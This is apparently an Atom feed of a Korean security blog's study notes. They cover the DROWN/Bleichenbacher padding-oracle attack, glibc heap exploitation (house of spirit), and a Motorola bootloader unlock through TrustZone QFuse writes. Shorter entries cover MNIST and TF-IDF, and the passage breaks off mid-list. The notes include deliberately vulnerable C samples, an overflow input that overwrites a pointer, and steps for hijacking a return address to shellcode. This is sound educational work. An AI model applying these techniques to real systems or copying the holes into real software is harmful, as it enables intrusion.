<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[KC's blog]]></title>
  <link href="http://zomo.heroku.com/atom.xml" rel="self"/>
  <link href="http://zomo.heroku.com/"/>
  <updated>2016-03-03T13:40:48+09:00</updated>
  <id>http://zomo.heroku.com/</id>
  <author>
    <name><![CDATA[KC]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[The DROWN Attack]]></title>
    <link href="http://zomo.heroku.com/blog/2016/03/03/the-drown-attack/"/>
    <updated>2016-03-03T09:38:55+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/03/03/the-drown-attack</id>
    <content type="html"><![CDATA[<p><a href="https://drownattack.com">The DROWN Attack</a></p>

<p>1,000 번의 TLS 핸드쉐이크를 관찰하고, 40,000 번의 SSLv2 연결을 시도해보고, 2<sup>50</sup> 번의 symmetric cipher 연산을 하면, 2048-bit RSA TLS 핸드쉐이크를 해독하는 것이 가능하다&hellip;고 한다.</p>

<p>배정된 CVE 는 다음과 같다.</p>

<ul>
<li>CVE-2016-0800</li>
<li>CVE-2015-3197</li>
<li>CVE-2016-0703</li>
<li>CVE-2016-0704</li>
</ul>


<h4>The PKCS#1 v1.5 padding structure</h4>

<p>DROWN 공격은 RSA PKCS# v1.5 padding 구조를 이용함.</p>

<p>N = p*q, l = len(N), e 는 euler_pi(N) 과 coprime 인 정수(아마도 3 이나 65537)라고 할때, k 는 symmetric key 라고 할 때, 암호화를 돌릴 블럭은 다음과 같이 만든다. <code>m = 00 || 02 || PS || 00 || k</code></p>

<ul>
<li>처음 <code>00</code> 은 암호화를 돌릴 블럭(EB)가 N 보다 작은 정수가 되게 만들기 위해 집어 넣는 것</li>
<li><code>02</code> 는 block type</li>
<li>PS 는 패딩. len(PS) >= 8 이어야 한다. 패딩을 prepend 하는 구조. EB 와 modulo N 이 같은 byte length 를 갖도록 맞춰주는 녀석이라고 보면 된다.</li>
<li>k 는 주로 symmetric key 가 되는데, SSLv2 에서는 master_key 가 k 라고 보면 된다.</li>
<li>이 EB 를 정수로 변환한다. 변환은 256 의 index 승을 계속 곱해서 더해나가며 바이트 블럭을 변환하는 식.</li>
<li>정수로 변환해서 c = m<sup>e</sup> mod N</li>
</ul>


<h4>The SSLv2 handshake protocol</h4>

<ul>
<li>클라이언트가 <code>ClientHello</code> 를 보냄</li>
<li>서버는 <code>ServerHello</code> 를 보냄</li>
<li>c->s, <code>ClientMasterKey</code></li>
<li>s->c, <code>ServerVerify</code></li>
<li>c->s, <code>Finished</code></li>
<li>s->c, <code>Finished</code></li>
</ul>


<p>그럼 보내는 내용을 정리하면,</p>

<ul>
<li>c->s, <code>ClientHello</code>: 클라이언트 지원 cipher suites. 그리고 클라이언트 nonce (챌린지)</li>
<li>s->c, <code>ServerHello</code>: 서버 지원 cipher suites. 서버 인증서. 서버 nonce (커넥션 ID)</li>
<li>c->s, <code>ClientMasterKey</code>: 공통의 cipher suites. 그리고 master_key 를 위한 키 데이터.</li>
<li>s->c, <code>ServerVerify</code>:</li>
<li>c->s, <code>Finished</code></li>
<li>s->c, <code>Finished</code></li>
</ul>


<p>Export 등급 <code>ClientMasterKey</code> 단계를 더 정리하면 (40-bit SSL_RC2_128_CBC_EXPORT40_WITH_MD5 가정).</p>

<ul>
<li>clear_key_data</li>
<li>secret_key_data (RSA PKCS#1 v1.5 로 암호화)</li>
<li>master_key = clear_key_data || secret_key_data</li>
<li>40-bit 경우, secret_key_data 는 5 bytes. (5*8 = 40)</li>
</ul>


<p>Non-export 등급은 master_key 전체가 암호화되어있고, clear_key_data 의 길이는 zero. 즉 Export 등급은 의도적으로 약화시킨 것이라고 보면 된다.</p>

<p>하여간, 이 정보들로 c,s 는 각각 session key 를 계산한다.</p>

<ul>
<li>server_write_key = MD5( mk || 0 || challenge || 커넥션 ID )</li>
<li>client_write_key = MD5( mk || 1 || challenge || 커넥션 ID )</li>
</ul>


<p>그리고, challenge 를 <code>server_write_key</code> 로 암호화해서 <code>ServerVerify</code> 메시지로 보낸다.</p>

<h4>The Drown attack</h4>

<p>Drown 공격은 SSLv2 핸드쉐이크의 다음 몇가지를 활용한다.</p>

<ul>
<li>secret_key_data 는 PKCS#1 v1.5 로 암호화한다는 사실</li>
<li>그리고, 클라이언트가 보내준 secret_key_data 를 자신의 private key (d) 로 복호화해서 master_key 를 만든다음에 그걸로 클라이언트가 보내준 <code>challenge</code> 를 암호화해서 다시 클라이언트에게 보내준다는 점. 이런 복호화 서비스를 서버는 항상 해준다는 점. 그것도 바로바로 즉시즉시.</li>
<li>secret_key_data 는 수출등급의 경우 단지 5 바이트에 불과하다는 사실</li>
</ul>


<p>이런 사실때문에 Drown 공격은 chosen-ciphertext attack.</p>

<h4>OpenSSL SSLv2 cipher suite selection bug</h4>

<p>Drown 공격이 OpenSSL 과 만나 심각해지는 포인트.</p>

<p>SSLv2 핸드쉐이크를 진행할때, <code>ClientMasterKey</code> 로 공통의 cipher suites 를 보내야하는데,
OpenSSL version &lt;= 1.1.0 의 경우, 서버가 지정하지않은 것도 client 맘대로 보내서 관철시킬 수 있는 버그가 있었다. 서버가 지원하지도 않는 수출등급 cipher 를 강제시킬 수 있는 것이다. CVE-2015-3197.</p>

<h4>Bleichenbacher&rsquo;s attack</h4>

<p>Bleichenbacher 의 공격은 apdding oracle attack. RSA ciphertext 는 PKCS#1 v1.5 padding format 을 준수하는 plaintext 로 복호화되어야한다는 사실을 활용한다.</p>

<p>그럼 PKCS#1 v1.5 padding format 을 준수한다는 것의 의미는,</p>

<ul>
<li><code>00||02||PS||00||k</code> 형태</li>
<li>|PS| >= 8</li>
<li>m[3]~m[10] 에는 0x00 이 없어야 함 (적어도 8 바이트)</li>
</ul>


<p>그럼, Bleichenbacher 알고리즘은</p>

<ul>
<li>공격자는 PKCS#1 v1.5 ciphertext 를 가지고 있음</li>
<li>공격자는 private key 는 접근 못함</li>
<li>그러나 oracle 을 가지고 있다고 가정한다.</li>
<li>oracle 은 1 or 0 을 리턴하는데,</li>
<li>m = c<sup>d</sup> mod N 의 값이 0x00 02 로 시작하면 1</li>
<li>아니면 0 을 돌려준다.</li>
</ul>


<p>이런 oracle 을 가지고 있다고 가정할 경우.</p>

<ul>
<li>oracle 이 1 을 돌려주면, plaintext m 이 어떤 특정 레인지 안쪽에 있다고 생각할 수 있다.</li>
<li>그 레인지는 0x00020000&hellip;. 보다는 크거나 같고, 0x0002FFFF&hellip;. 보다는 작거나 같고.</li>
<li>식으로 표시하면 2B &lt;= m &lt;= 3B -1, where B = 2<sup>8*(len-2)</sup></li>
</ul>


<p>그 다음 스텝은 RSA 연산의 변형성을 활용하는 것.</p>

<ul>
<li>d 는 몰라도 e 는 알고 있으니,</li>
<li><code>c_0 = m_0 ^ e mod N</code> 이라고 하면 양쪽에 s<sup>e</sup> 를 곱하면</li>
<li><code>c = (c_0 * s^e) mod N = (m_0 * s)^e mod N</code> 이 되니까, m_0 에 s 를 곱한 값을 encrypt 시킨 셈이 된다.</li>
<li>이 encrypted 된 값을 가지고 oracle 에 물어본다.</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[MNIST for ML Beginners]]></title>
    <link href="http://zomo.heroku.com/blog/2016/02/25/mnist-for-ml-beginners/"/>
    <updated>2016-02-25T12:09:04+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/02/25/mnist-for-ml-beginners</id>
    <content type="html"><![CDATA[<p>TensorFlow 를 들여다보고 있다.</p>

<p><a href="https://www.tensorflow.org/versions/r0.7/tutorials/mnist/beginners/index.html#mnist-for-ml-beginners">첫번째 튜토리얼</a></p>

<p>TensorFlow docker image 설치</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>z@zui-MacBook-Pro-2  ~/git/octopress   master ●  docker images
</span><span class='line'>REPOSITORY                                TAG                 IMAGE ID            CREATED             SIZE
</span><span class='line'>b.gcr.io/tensorflow/tensorflow            latest              002f882bde74        8 days ago          674.3 MB
</span><span class='line'>b.gcr.io/tensorflow-udacity/assignments   latest              59e4920e40f5        3 weeks ago         701.9 MB
</span><span class='line'>hello-world                               latest              690ed74de00f        4 months ago        960 B</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Plaid CTF 2015 - One NULL Byte]]></title>
    <link href="http://zomo.heroku.com/blog/2016/02/16/plaid-ctf-2015-one-null-byte/"/>
    <updated>2016-02-16T18:07:14+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/02/16/plaid-ctf-2015-one-null-byte</id>
    <content type="html"><![CDATA[<ul>
<li><a href="http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup">Write-up</a></li>
<li><a href="https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/tp">Binaries</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Understanding the Heap &amp; Exploiting Heap Overflows]]></title>
    <link href="http://zomo.heroku.com/blog/2016/02/12/understanding-the-heap-and-exploiting-heap-overflows/"/>
    <updated>2016-02-12T16:13:07+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/02/12/understanding-the-heap-and-exploiting-heap-overflows</id>
    <content type="html"><![CDATA[<p>Mathy Vanhoef blog 의 <a href="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html">Understanding the Heap &amp; Exploiting Heap Overflows</a> 를 정리한다.</p>

<p>먼저 취약한 예제.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>
</span><span class='line'>int main(int argc, char *argv[])
</span><span class='line'>{
</span><span class='line'>  char *buf1 = malloc(128);
</span><span class='line'>  char *buf2 = malloc(256);
</span><span class='line'>
</span><span class='line'>  printf("addr buf1: %p\n", buf1);
</span><span class='line'>  printf("addr buf2: %p\n", buf2);
</span><span class='line'>
</span><span class='line'>  read(fileno(stdin), buf1, 200);
</span><span class='line'>
</span><span class='line'>  free(buf2);
</span><span class='line'>  free(buf1);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<h4>Basic Heap and Chunk Layout</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct malloc_chunk {
</span><span class='line'>  INTERNAL_SIZE_T     prev_size;
</span><span class='line'>  INTERNAL_SIZE_T     size;
</span><span class='line'>  
</span><span class='line'>  struct malloc_chunk* fd;
</span><span class='line'>  struct malloc_chunk* bk;
</span><span class='line'>
</span><span class='line'>  struct malloc_chunk* fd_nextsize;
</span><span class='line'>  struct malloc_chunk* bk_nextsize;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<h4>Interpretation of the Chunk Structure</h4>

<ul>
<li>Allocated chunk 에서 사용되는 필드는 size 뿐이다.</li>
<li>그리고, <code>malloc()</code> 으로 돌아오는 포인터는 <code>fd</code> 랑 일치한다.</li>
<li><code>fd</code>, <code>bk</code> 를 이용해서 free 된 chunk 를 doubly linked list 로 관리한다.</li>
<li>size 의 하위 3 bit 는 사용되지 않는다. (align 되기때문에 항상 000 이 된다)</li>
<li>그래서, size 의 사용되지 않는 하위 비트들을 flag 로 사용한다.</li>
<li>size 의 LSB 는 previous chunk 가 alloc 인지 아닌지 flag 로 사용된다.</li>
<li>current chunk 가 사용되고 있는지 아닌지 아는 방법은, next chunk 의 size 필드의 LSB 를 보는 것이다. 즉 <code>cur_chunk + size + sizeof(INTERNAL_SIZE_T)</code> 로 next chunk 로 가서, <code>size &amp; 0x1</code> 로 체크하는 것이다.</li>
</ul>


<h4>Managing Free Chunks</h4>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Unlocking the Motorola Bootloader by Azimuth Security]]></title>
    <link href="http://zomo.heroku.com/blog/2016/02/12/unlocking-the-motorola-bootloader-by-azimuth-security/"/>
    <updated>2016-02-12T10:12:12+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/02/12/unlocking-the-motorola-bootloader-by-azimuth-security</id>
    <content type="html"><![CDATA[<p>이번에는 좀 오래되었지만, Azimuth Security 블로그의 글을 정리해본다.</p>

<p><a href="http://blog.azimuthsecurity.com/2013/04/unlocking-motorola-bootloader.html?m=1">Unlocking the Motorola Bootloader</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How2heap]]></title>
    <link href="http://zomo.heroku.com/blog/2016/02/11/how2heap/"/>
    <updated>2016-02-11T17:45:34+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/02/11/how2heap</id>
    <content type="html"><![CDATA[<p>shellphish team 에서 github 에 공개한 <a href="https://github.com/shellphish/how2heap">Educational Heap Exploitation</a> 을 정리한다.</p>

<ul>
<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">Understanding glibc malloc</a></li>
</ul>


<h3>first_fit.c</h3>

<p><a href="https://github.com/shellphish/how2heap/blob/master/first_fit.c">first_fit.c</a></p>

<p>malloc() allocator 의 behavior 때문에 생기는 use after free 상황을 설명하기 위한 예제.</p>

<p>malloc() 후에, free() 하고 다시 malloc() 을 했더니, 두 개의 포인터가 동일한 위치를 가리킨다. 편의상 포인터를 A,B 라고 하자. A 는 free 된 포인터, B 는 legitimate 한 포인터. B 를 통해 메모리 내용을 조작한다음에 A 가 사용되면 A object 의 context 에서 메모리내용이 해석되기때문에, 의도치않은 코드가 수행될 수 있다.</p>

<h3>unsafe_unlink.c</h3>

<p><a href="https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c">unsafe_unlink.c</a></p>

<h3>house_of_spirit.c</h3>

<p><a href="https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c">house of spirit</a></p>

<p>House of spirit 공격을 설명하기 위한 예제.</p>

<p>House of spirit 공격을 요약하면.</p>

<ul>
<li>House of spirit 공격은 다른 heap 공격과는 달리, 메타데이터를 overwrite 하는 것이 목적이 아니다.</li>
<li>malloc() 에서 return 되는 address 를 컨트롤 할 수 있다.</li>
<li><code>p = malloc(...); memcpy(p, user_supplied_data, 128);</code> 에서 p 의 값을 컨트롤 할 수 있다면, code execution 은 어렵지 않다. 임의의 주소에 임의의 값을 쓸 수 있는 primitive 를 얻게 되는 셈이니.</li>
<li>p 를 컨트롤하는 방법은, 가짜 chunk 주소를 fastbin 에 밀어넣어서, 다음 malloc 때 저 chunk 가 리턴되게 하는 것.</li>
<li>가짜 chunk 주소를 fastbin 에 밀어넣는 방법은, free() 를 통해서.</li>
<li>정상적으로 malloc() 을 통해서 받아온 pointer <code>p</code> 를 free() 의 인자로 주는 것이 아니라, 공격하고 싶은 메모리 주소를 fastbin 에 밀어넣기 위한 조작된 데이터를 free() 의 인자로 넘긴다.</li>
<li>즉 <code>free(a); p = malloc(128); memcpy(p, user_supplied_data, 128);</code> 라는 시퀀스를 공격하는 것이다.</li>
</ul>


<p>즉 요약하면, <code>dlmalloc</code> 이나, <code>glmalloc</code> 등이 OS 에서 <code>sbrk()</code> 나 <code>mmap()</code> 으로 받아온 메모리가 아니라, 임의의 메모리가 malloc() 의 리턴값으로 떨어지게 만드는 공격 방법. 이를 레버리지해서 임의의 주소에 원하는 값을 쓰는 식으로 발전한다.</p>

<ul>
<li><a href="https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/">GB_MASTER&rsquo;s /dev/null</a></li>
</ul>


<p>blackngel &amp; gb_master 의 vuln.c 를 들여다봤다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>
</span><span class='line'>void fvuln(char *str1, int age)
</span><span class='line'>{
</span><span class='line'>  char *ptr1, name[32];
</span><span class='line'>  int local_age;
</span><span class='line'>  char *ptr2;
</span><span class='line'>
</span><span class='line'>  local_age = age;
</span><span class='line'>
</span><span class='line'>  ptr1 = (char *) malloc(256);
</span><span class='line'>  printf("PTR1 = [ %p ]\n", ptr1);
</span><span class='line'>  strcpy(name, str1); // &lt;----- (1)
</span><span class='line'>  printf("PTR1 = [ %p ]\n", ptr1);
</span><span class='line'>  free(ptr1); // &lt;----- (2)
</span><span class='line'>
</span><span class='line'>  ptr2 = (char *) malloc(40); // &lt;----- (3)
</span><span class='line'>  snprintf(ptr2, 40-1, "%s is %d years old", name, local_age); // &lt;----- (4)
</span><span class='line'>  printf("%s\n", ptr2);
</span><span class='line'>}
</span><span class='line'>int main(int argc, char *argv[])
</span><span class='line'>{
</span><span class='line'>  int pad[10] = { 0,0,0,0,0,0,0,10,0,0};
</span><span class='line'>  if (argc == 3)
</span><span class='line'>      fvuln(argv[1], atoi(argv[2]));
</span><span class='line'>  return 0;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Malloc Des-Maleficarum 의 흐름을 정리하면,</p>

<ul>
<li>(1) 에서 ptr1 에 대한 overwrite 가 일어난다.</li>
<li>(2) 에서 잘못된 주소가 fastbin 에 들어간다.</li>
<li>(3) 에서 (2) 의 주소가 return 된다.</li>
<li>(4) 에서 잘못된 주소에 잘못된 데이터가 써진다.</li>
</ul>


<p>이걸 exploit 하기 위해, 저자는 ASLR off, noexec=off, GCC stack protection off 를 해주었다고. 그리고, stack 의 return address 를 overwrite 했음.</p>

<p>우선 ptr1 overwrite 를 테스트하기 위해,</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./hos `perl -e 'print "A"x32 . "BBBB" . "CCCC"'` 20
</span><span class='line'>PTR1 = [ 0x804b008 ]
</span><span class='line'>PTR1 = [ 0x43434343 ]
</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>


<p>메모리 주소들을 떠보면, (저자는 PTR2 가 왜 저기 끼어들어갔는지 모르겠다고, gcc 탓을 한다)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>RET      -&gt; 0xFFFFCF2C
</span><span class='line'>EBP       -&gt; 0xFFFFCF28
</span><span class='line'>local_age -&gt; 0xFFFFCF24 (overwritten with a NUL)
</span><span class='line'>PTR1      -&gt; 0xFFFFCF20 [0x43434343]에 위치
</span><span class='line'>PTR2      -&gt; 0xFFFFCF1C [0x42424242]
</span><span class='line'>name      -&gt; 0xFFFFCEFC</span></code></pre></td></tr></table></div></figure>


<p>즉, name[32] 가 overflow 나서, ptr1 &amp; ptr2 가 overwrite 된 상황.</p>

<ul>
<li>chunk 주소를 0xffffCF20 으로 하고, ptr1 을 0xffffCF28 로 (+8) overwrite 하면</li>
<li>chunk->size 의 주소는 0xffffCF24 가 되고, 여기를 0x30 으로 overwrite 시켜야함.</li>
<li>_int_free() 의 fastbin check code 를 통과하기 위해서는, next chunk (chunk addr + size) 의 size 도 세팅해줘야함. (나중에 확인해보자)</li>
<li>두번째 malloc() 에서는 0xffffCF28 이 돌아오게 될 것임</li>
<li><code>snprintf(0xffffCF28, 39, "%s ...", name, ...)</code> 이 되니까, RET 를 overwrite 하기 위해서는 name[4],name[5],name[6],name[7] 에 원하는 return 주소가 담겨야함. 즉 RET 를 0xffffCEFC (name 이 위치한 곳) 로 overwrite. 그리고 이 주소에 shellcode 도입부가 위치함.</li>
<li>쉘코드는 &ldquo;4 bytes JMP 코드 + 4 byte the new RET value + shellcode&rdquo; 로 구성.</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Racing MIDI Messages in Chrome]]></title>
    <link href="http://zomo.heroku.com/blog/2016/02/11/racing-midi-messages-in-chrome/"/>
    <updated>2016-02-11T17:36:37+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/02/11/racing-midi-messages-in-chrome</id>
    <content type="html"><![CDATA[<p>PZ 블로그에 새로 올라온 글, <a href="http://googleprojectzero.blogspot.kr/2016/02/racing-midi-messages-in-chrome.html">Racing MIDI messages in Chrome</a>를 읽었다. 정리해본다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Unlocking the Motorola Bootloader]]></title>
    <link href="http://zomo.heroku.com/blog/2016/02/11/unlocking-the-motorola-bootloader/"/>
    <updated>2016-02-11T15:34:54+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/02/11/unlocking-the-motorola-bootloader</id>
    <content type="html"><![CDATA[<p>Bits, Please! 블로그에 올라온 <a href="http://bits-please.blogspot.in/2016/02/unlocking-motorola-bootloader.html">Unlocking the Motorola Bootloader</a> 를 읽어보았다.</p>

<p>모토로라 휴대폰의 부트체인은, PBL (Primary Boot Loader) -> SBL1 (Secondary Boot Loader) -> SBL2 -> SBL3 -> aboot -> Linux Kernel 의 순서로 올라온다고.</p>

<p>저자는 제조사가 제공하는 img 화일을 분석해서, aboot 이미지를 뜯어내었다.</p>

<p>unlock 스트링을 검색해서, 언락을 수행하는 코드를 찾았다고 한다.</p>

<p>unlock 을 수행하기 위해서 sub_FF4BA80() -> sub_FF4BA60() -> sub_FF4BA40() 을 차례로 호출하는데, 그 중에 하나가 성공하면 바로 리부팅으로 들어간다.</p>

<p>sub_FF4BA80() 을 봤더니,</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int sub_FF4BA80()
</span><span class='line'>{
</span><span class='line'>  if (!sub_FF027F8(0x6D))
</span><span class='line'>      sub_FF02BEC(0x6D, 1);
</span><span class='line'>  return 0;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p><code>sub_FF027f8()</code>, <code>sub_FF02BEC()</code> 를 봤더니, 결국은 어떤 함수를 호출하는데, 그 함수에는 <code>SMC #0</code> 명령이 담겨있었다. 저자는 unlocking 코드가 결국은 TrustZone 에 위치하고 있다고 의심한다. LR 에 담긴 TZ 어드레스는 0x3F801.</p>

<p>TZ 커널 시스템 콜을 분석한 결과, 다음과 같은 엔트리를 발견했다고.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>DCD 0x3F801
</span><span class='line'>DCD aMotorola_tzbsp   ; "motorola_tzbsp_ns_service"
</span><span class='line'>DCD 0xD
</span><span class='line'>DCD motorola_tzbsp_ns_service+1
</span><span class='line'>DCD 4
</span><span class='line'>DCD 4
</span><span class='line'>DCD 4
</span><span class='line'>DCD 4
</span><span class='line'>DCD 4</span></code></pre></td></tr></table></div></figure>


<p>이 콜은 QFuses 에서 읽고 쓰는 함수. QFuses 는 Qualcomm 에서 만든, 한번 날리면 그 이후에는 software 적으로 write 가 불가능한 immutable 한 메모리.</p>

<p>정리하면,</p>

<ul>
<li>aboot 가 SMC 0x3F801 를 호출 (command-code #1) -> TZ kernel 이 QFuse @ 0xFC4B86E8 을 읽어 반환</li>
<li>첫번째 비트가 0 이라면, SMC 0x3F801 을 다시 호출 (command-code #2) -> TZ kernel 이 QFuse 의 LSB 를 1 로 세팅</li>
</ul>


<p>이걸로 unlock 이 끝난다고.</p>

<p>그렇다면, QFuses 를 write 하려면?</p>

<p>다행히도, TZ kernel 이 두개의 함수를 제공한다고. <code>tzbsp_qfprom_read_row()</code> &amp; <code>tzbsp_qfprom_write_row()</code></p>

<p>그런데, QFuses 에 쓰는 함수가 몇가지 체크를 하는데, 이 체크를 bypass 해야한다.</p>

<ul>
<li>메모리 DWORD 0xFE823D5C 가 0 이 아니어야하고.</li>
<li>is_allowed_fuse_row() 에서 허가된 QFuse 어드레스인지 체크함.</li>
</ul>


<p>TZ code execution exploit 에서 저 두가지를 미리 셋업해줘야한다고 함. 미리 셋업하고, <code>tzbsp_qfprom_write_row()</code> 를 불러서 unlock 수행.</p>

<p>관련된 코드를 저자가 <a href="https://github.com/laginimaineb/Alohamora">github</a> 에 공개하였다.</p>

<p><code>build_shellcode.sh</code> 를 보았다. <code>shellcode.S</code> 를 arm-eabi-gcc 를 이용해서 어셈블, 링킹하고 arm-eabi-objcopy 를 통해서 elf -> raw binary 로 변환한다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Dependency of Android SDK]]></title>
    <link href="http://zomo.heroku.com/blog/2016/02/07/the-dependency-of-android-sdk/"/>
    <updated>2016-02-07T14:44:35+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/02/07/the-dependency-of-android-sdk</id>
    <content type="html"><![CDATA[<p><a href="http://stackoverflow.com/questions/23182765/how-to-install-ia32-libs-in-ubuntu-14-04-lts-trusty-tahr">14.04 에서 Android SDK 디펜던시 문제</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo apt-get install -y libc6-i386 lib32stdc++6 lib32gcc1 lib32ncurses5 lib32z1</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Qseecom]]></title>
    <link href="http://zomo.heroku.com/blog/2016/02/03/qseecom/"/>
    <updated>2016-02-03T16:10:29+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/02/03/qseecom</id>
    <content type="html"><![CDATA[<p>bits-please blog 에 있는 글을 정리해본다.</p>

<p><a href="http://bits-please.blogspot.co.il/2015/08/android-linux-kernel-privilege.html">Android Linux Kernel Privilege</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[TF-IDF]]></title>
    <link href="http://zomo.heroku.com/blog/2016/01/15/tf-idf/"/>
    <updated>2016-01-15T15:10:14+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/01/15/tf-idf</id>
    <content type="html"><![CDATA[<p>&ldquo;Multiplying TF and IDF therefore favours generally rare words that nevertheless occur often in our pages.&rdquo;</p>

<p>TF-IDF 의 아이디어는 사실 단순하다.</p>

<ol>
<li>웹페이지 하나를 분석한다고 치자. 분석 목적은 키워드 추출.</li>
<li>가장 많이 등장하는 단어로 키워드를 추출한다면, &ldquo;the&rdquo; 나 &ldquo;a&rdquo; 같은 관사, 혹은 &ldquo;and&rdquo; 같은 전치사가 가장 많이 등장하지 않을까?</li>
<li>절대적인 빈도가 아니라 상대적인 빈도가 더 맞을 것 같은데.</li>
<li>&ldquo;the&rdquo; 의 경우 거의 모든 웹페이지에 등장할테니 상대적인 중요도는 떨어지지않을까?</li>
<li>얼마나 많은 웹페이지에 등장하느냐를 측정하는 것이 IDF (Inverse Document Frequency)</li>
<li>(특정 단어가 포함된 도큐먼트의 수/전체 도큐먼트 수)<sup>-1</sup></li>
<li>Inverse 를 해주었기때문에 rare 한 단어의 경우 IDF 값이 커진다. (실상황에서는 log 값이 유의미하다고)</li>
<li>하나의 문서에 등장하는 단어 빈도를 그대로 사용하지 말고 IDF 로 보정해주면, heuristic 하게 꽤 유의미한 키워드를 추출할 수 있다고 한다.</li>
